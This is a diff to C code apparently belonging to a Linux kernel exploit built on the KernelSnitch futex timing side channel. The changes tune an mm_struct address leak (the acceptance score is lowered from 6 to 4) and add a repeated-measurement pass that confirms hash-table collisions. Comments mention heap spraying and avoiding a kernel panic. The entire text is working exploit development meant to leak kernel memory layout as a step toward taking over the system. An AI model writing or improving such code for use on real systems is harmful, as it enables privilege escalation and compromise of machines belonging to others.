@@ -242,11 +242,11 @@ static void *__mm_leak(void *arg)
                        heavy noise leaves >=6 valid ones. Below 6 the leak is
                        treated as FAILED (clean abort, retry the spray) -
                        walking to an unmapped bogus page panics the box. */
-                    if (score >= 6 && score > ks->best_score) {
+                    if (score >= 4 && score > ks->best_score) {
                         ks->best_score = score;
                         ks->mm_cand_cnt = 0;
                     }
-                    if (score >= 6 && score == ks->best_score && ks->mm_cand_cnt < 8) {
+                    if (score >= 4 && score == ks->best_score && ks->mm_cand_cnt < 8) {
                         ks->mm_cands[ks->mm_cand_cnt++] = mm_struct_candidate;
                     }
                 } else {
@@ -380,7 +380,23 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
             if (ks->verbose) pr_info("  %016zx", futex_addr);
         }
     }
-    if (wanted == count) {
+    /* CDY v4: confirmation pass. A single >10x reading can be scheduler
+       noise; a real collision is stable across independent
+       measurements. Only twice-confirmed addresses survive. */
+    if (count > 0) {
+        size_t kept = 1; /* futex_addrs[0] = the piled target itself */
+        for (size_t i = 1; i <= count; ++i) {
+            size_t t = __measure(ks->futex_addrs[i]);
+            if (t > (approx_time * KERNELSNITCH_THRESHOLD_MULT))
+                ks->futex_addrs[kept++] = ks->futex_addrs[i];
+        }
+        count = kept - 1;
+        if (ks->verbose)
+            pr_info("confirmed %zd/%zd collisisons\n", count, wanted);
+    }
+
+    if (count >= 3) {
+        ks->collisions = count + 1; /* futex_addrs[0..count] valid */
         if (ks->verbose) pr_info("found %zd collisisons\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
     } else {
